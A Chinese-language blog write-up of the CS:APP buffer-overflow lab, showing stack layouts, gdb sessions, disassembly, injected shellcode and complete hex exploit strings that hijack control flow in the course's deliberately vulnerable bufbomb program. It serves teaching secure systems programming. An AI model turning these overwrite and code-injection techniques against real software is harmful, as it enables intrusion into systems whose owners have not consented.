Title: Buffer Overflow Attack实验
Date: 2016-2-19
Category: c&c++
Tags: buffer overflow attack, security, hack, x86, stack
Author: jin

这是cmu经典课程csapp的实验之一，主要任务是对课程提供的bufbomb程序进行buffer overflow攻击，以帮助我们深入理解x86 IA-32体系结构的函数调用惯例和栈组织结构，从而认识到这种攻击方法的本质，对我们编写安全的系统级代码非常有好处。这些实验同时也展示了如何攻击操作系统和网络服务器的安全弱点。

实验提供了以下3个可执行文件：

- bufbomb: 这是我们要攻击的目标程序；
- makecookie：根据用户id生成一个唯一的cookie，这个主要是防止抄袭作业:)；
- hex2raw：将16进制的ascii值转换称对于的ascii字符；

bufbomb程序会从标准输入中读取一个字符串，调用getbuf函数：

    :::c
    /* Buffer size for getbuf */
    #define NORMAL_BUFFER_SIZE 32

    int getbuf()
    {
        char buf[NORMAL_BUFFER_SIZE];
        Gets(buf);
        return 1;
    }
显然如果用户输入的字符串长度大于31时，就会破坏bufbomb的栈，如果在输入的字符串中带有特殊的地址和指令，就达到了攻击目的。下面的几个实验任务都是需要在这个字符串中嵌入特殊的指令和地址来完成实验任务。

###Test 1: Candle
bufbomb中函数test会调用getbuf，如下：

    :::c
     void test()
     {
         int val;
         /* Put canary on stack to detect possible corruption */
         volatile int local = uniqueval();

         val = getbuf();

         /* Check for corrupted stack */
         if (local != uniqueval()) {
            printf("Sabotaged!: the stack has been corrupted\n");
         }
         else if (val == cookie) {
            printf("Boom!: getbuf returned 0x%x\n", val);
            validate(3);
         } else {
            printf("Dud: getbuf returned 0x%x\n", val);
         }
     }

正常来说当test执行完getbuf后会继续执行后面的代码。

**实验任务**:是要改变这个执行路线，即当getbuf返回后不会沿着test执行下去，而是去执行smoke函数：

    :::c
    void smoke()
    {
        printf("Smoke!: You called smoke()\n");
        validate(0);
        exit(0);
    }
这个实验挺简单，就是需要改变getbuf的返回地址为smoke入口地址即可。首先对bufbomb进行反汇编：
    objdump -d bufbomb > bufbomb.asm
找到smoke的入口地址为：0x08048c18，下面如何将getbuf的返回地址替换为这个地址呢？这里我们要对x86的函数调用栈帧非常熟悉，可参考： https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames。
当调用getbuf时，栈帧大概位置如下：

    high ------------------------
        |  return addr to test() |
        |------------------------|
        |     ebp for test()     |
        |------------------------|<--- [ebp]
        |                        |
        |------------------------|    total 40 bytes                
        |        32 bytes        |
        |         buf            |
        |------------------------|<--- [ebp-0x28], start of buf
        |                        |
        |------------------------|
        |                        |<--- esp
    low |------------------------|

上面buf局部变量是保存输入的字符串的，它的地址为ebp-0x28（通过查看getbuf的反汇编代码），我们要修改的地址在return addr。显然我们输入的字符串只要一直overflow到return addr即可，总共44字节，最后加上smoke的地址，即能完成修改。
由于输入的是字符串，而这个我们要将smoke的地址（4个字节）转换成对应的字符，hex2raw能帮我们完成这个转换，但由于该程序是x86-64平台的，不能在32位系统上运行，可用下面的python来代替：

    :::python
    #! /usr/bin/env python
    # coding=utf-8

    import sys, os

    raw = ''
    input = raw_input()
    for hex in input.split():
        raw += chr(int(hex, 16))
    print raw

我们将输入的字符串对应的16进制值写到一个文本文件level1.txt中，内容如下：

    31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 18 8c 04 08
前面的44个字节为任意字符（但不能为\n，表示输入结束），最后的4个字节为smoke的入口地址（注意x86是little endian字节序）。然后用hex2raw.py将这个文件转换成对应的字符串ans.raw。

下面通过gdb来检验一下是否成功。在gdb中getbuf处设置断点:


    (gdb) r -u yj < ans.raw 
    Starting program: /home/yj/yangjin/cs_app/buflab/buflab-handout/bufbomb -u yj < ans.raw
    Userid: yj
    Cookie: 0x3ab24af4

    Breakpoint 1, 0x080491fa in getbuf ()
    (gdb) info registers 
    eax            0x615ef6a	102100842
    ecx            0xb7fbf068	-1208225688
    edx            0xb7fbf3cc	-1208224820
    ebx            0x0	0
    esp            0x556836a8	0x556836a8 <_reserved+1037992>
    ebp            0x556836e0	0x556836e0 <_reserved+1038048>
    esi            0x55686018	1432903704
    edi            0x1	1
    eip            0x80491fa	0x80491fa <getbuf+6>
    eflags         0x212	[ AF IF ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51

查看当前栈(esp=0x556836a8)的信息：

    (gdb) x/20x 0x556836a8
    0x556836a8 <_reserved+1037992>:	0x0000513a	0xb7fbf3cc	0x0000000c	0x1126312e
    0x556836b8 <_reserved+1038008>:	0x00000000	0xb7fc0898	0x00000000	0x08048da8
    0x556836c8 <_reserved+1038024>:	0x0000513a	0x0804836c	0xb7e586b1	0xb7fbf000
    0x556836d8 <_reserved+1038040>:	0xb7fbfac0	0xb7fbfd80	0x55683710	0x08048dbe
    0x556836e8 <_reserved+1038056>:	0xb7fbfac0	0x0804a57e	0x55683720	0x00000001

buf的起始地址为：ebp-0x28=0x556836e0-0x28=0x556836b8。上面打印的栈空间第4行的最后4个字节ox08048dbe就是getbuf的return addr，同时也是test函数的call getbuf的下一条指令：

    8048daa <test>:
    8048daa:	55                   	push   %ebp
    8048dab:	89 e5                	mov    %esp,%ebp
    8048dad:	53                   	push   %ebx
    8048dae:	83 ec 24             	sub    $0x24,%esp
    8048db1:	e8 da ff ff ff       	call   8048d90 <uniqueval>
    8048db6:	89 45 f4             	mov    %eax,-0xc(%ebp)
    8048db9:	e8 36 04 00 00       	call   80491f4 <getbuf>
    8048dbe:	89 c3                	mov    %eax,%ebx
    8048dc0:	e8 cb ff ff ff       	call   8048d90 <uniqueval>

然后继续单步执行，

    (gdb) n
    Single stepping until exit from function getbuf,
    which has no line number information.
    0x08048c18 in smoke ()
    (gdb) x/20x 0x556836a8
    0x556836a8 <_reserved+1037992>:	0x556836b8	0xb7fbf3cc	0x0000000c	0x1126312e
    0x556836b8 <_reserved+1038008>:	0x31313131	0x31313131	0x31313131	0x31313131
    0x556836c8 <_reserved+1038024>:	0x31313131	0x31313131	0x31313131	0x31313131
    0x556836d8 <_reserved+1038040>:	0x31313131	0x31313131	0x31313131	0x08048c18
    0x556836e8 <_reserved+1038056>:	0xb7fbfa00	0x0804a57e	0x55683720	0x00000001

从上面看到我们从buf（0x556836b8）开始的内容全部改成了我们的输入的字符串，并且可以看到getbuf完后成功返回到smoke的入口地址。最后继续：

    (gdb) c
    Continuing.
    Type string:Smoke!: You called smoke()
    VALID
    NICE JOB!
    [Inferior 1 (process 20794) exited normally]
成功完成！

###Test2: Sparkler
bufbomb中有个fizz函数：

    void fizz(int val)
    {
        if (val == cookie) {
            printf("Fizz!: You called fizz(0x%x)\n", val);
            validate(1);
        } else
            printf("Misfire: You called fizz(0x%x)\n", val);
        exit(0);
    }

**实验任务**：test执行完getbuf后跳转到执行fizz，与之前不同的是，fizz有个参数，同时要将这个参数设为cookie这个值。

这个任务主要是要知道函数参数如何入栈(几种不同的方式：cdecl, stdcall, fastcall, thiscall等)，可参考前面提到的文章。

将getbuf的返回地址设为fizz入口地址这个跟前面实验一样，关键是在哪里设置这个参数。
前面gdb调试可看到在getbuf中执行时，ebp=0x556836e0，所以当getbuf执行完跳入fizz之前，esp=0x556836e8（为什么？因为getbuf最后执行两条指令leave和ret，leave会将ebp赋给esp，然后pop ebp，而ret指令相当于pop eip，共两次pop，整个过程相当于esp=ebp+4+4）。
fizz反汇编如下：

    8048c42 <fizz>:
    8048c42:	55                   	push   %ebp
    8048c43:	89 e5                	mov    %esp,%ebp
    8048c45:	83 ec 18             	sub    $0x18,%esp
    8048c48:	8b 45 08             	mov    0x8(%ebp),%eax
    8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax

进入fizz后，执行第一条指令push ebp，此时esp=esp-4=0x556836e4，然后执行mov %esp, %ebp，此时ebp=0x556836e4。根据上面的cmp指令可看出fizz的参数地址为ebp+0x8=0x556836ec，
这就是我们要放入cookie的值的地址（buf的起始地址仍跟前面一样0x556836b8）。
level2.txt的输入字符串如下：


    31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 42 8c 04 08 31 31 31 31 f4 4a b2 3a

上面08048c42是fizz的入口地址，3ab24af4是cookie。
执行如下命令：

    cat level1.txt  | ./hex2raw.py | ./bufbomb -u yj
    Userid: yj
    Cookie: 0x3ab24af4
    Type string:Fizz!: You called fizz(0x3ab24af4)
    VALID
    NICE JOB!
成功完成！


###Test 3: Firecracker
前面两个攻击都只是修改了函数调用路线，没什么卵用，本实验将实现如何让程序执行我们自己的hack的代码，这要就能随心所欲的干坏事了:)。在bufbomb中有如下代码：

    :::c
    int global_value = 0;
    void bang(int val)
    {
        if (global_value == cookie) {
            printf("Bang!: You set global_value to 0x%x\n", global_value);
            validate(2);
        } else
            printf("Misfire: global_value = 0x%x\n", global_value);
        exit(0);
    }

**实验任务**：在getbuf返回时执行我们自己定义的指令，这些指令要修改global_value值为cookie，然后执行bang函数。

总的思路就是编写修改global_value的汇编指令放在buf中，然后跟前面的实验一样，只是将跳转的地址改成buf的地址，这要执行getbuf后就跳到去执行汇编指令，这些汇编指令除了要修改global_value的值外，还要确保执行完后要能跳到bang函数执行。
我们的汇编指令如下(example.S)：

    movl $0x3ab24af4, 0x0804d100  #put cookie value in global_value (addr: 0x0804d100)
    pushl $0x08048c9d             #push bang entry address into stack
    ret
注意global_value的地址是将bufbomb的bss段objdump出来的。下面如何将这些汇编指令转换称机器指令呢？
可以使用如下命令：
    unix> gcc -m32 -c example.S
    unix> objdump -d example.o > example.d

example.d如下内容：
    
    00000000 <.text>:
    0:	c7 05 00 d1 04 08 f4 	movl   $0x3ab24af4,0x804d100
    7:	4a b2 3a 
    a:	68 9d 8c 04 08       	push   $0x8048c9d
    f:	c3                   	ret    
前面的数字就是对应的机器码，将这些机器码写入level3.txt，还有buf的起始地址：

    
    c7 05 00 d1 04 08 f4 4a b2 3a 68 9d 8c 04 08 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 b8 36 68 55

最后运行: 

    cat level3.txt  | ./hex2raw.py | ./bufbomb -u yj
    Userid: yj
    Cookie: 0x3ab24af4
    Type string:Bang!: You set global_value to 0x3ab24af4
    VALID
    NICE JOB!
完成任务！


###Test 4: Dynamite
前面的几个实验都成功的利用缓冲区来破坏栈并执行我们指定的函数，但是更精妙的攻击方式是让bufbomb执行完我们hack的代码，更改寄存器和内存后，仍然能够正常返回继续执行原程序test()函数。
**实验任务**：让getbuf函数返回cookie的值（而不是１）给test，并且要能正常返回到test中继续执行，这样test会输出“Boom!:...”
思路：跟前面实验类似，在buffer中加入我们自己的code，这段code会把cookie值设给eax（getbuf返回值通过eax传递），然后恢复正确的值给ebp（因为ebp的内容已被buffer破坏），接着将返回到test的指令地址入栈。最后需要将getbuf的返回地址改成buf的起始地址，以执行我们的code。
我们的汇编代码如下：

    movl $0x3ab24af4, %eax      #put cookie value in eax 
    pushl $0x08048dbe           #push address of next instruction after getbuf in test()  
    movl $0x55683710, %ebp      #set ebp of test correctly
    ret


按前面的方式获取对应的机器码：


    level3_run_code.o:     file format elf32-i386


    Disassembly of section .text:

    00000000 <.text>:
       0:	b8 f4 4a b2 3a       	mov    $0x3ab24af4,%eax
       5:	68 be 8d 04 08       	push   $0x8048dbe
       a:	bd 10 37 68 55       	mov    $0x55683710,%ebp
       f:	c3                   	ret    

最后得到我们的level4.txt为：

    b8 f4 4a b2 3a 68 be 8d 04 08 bd 10 37 68 55 c3 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 b8 36 68 55  

运行：

    cat level3.txt  | ./hex2raw.py | ./bufbomb -u yj
    Userid: yj
    Cookie: 0x3ab24af4
    Type string:Boom!: getbuf returned 0x3ab24af4
    VALID
    NICE JOB!
成功完成！
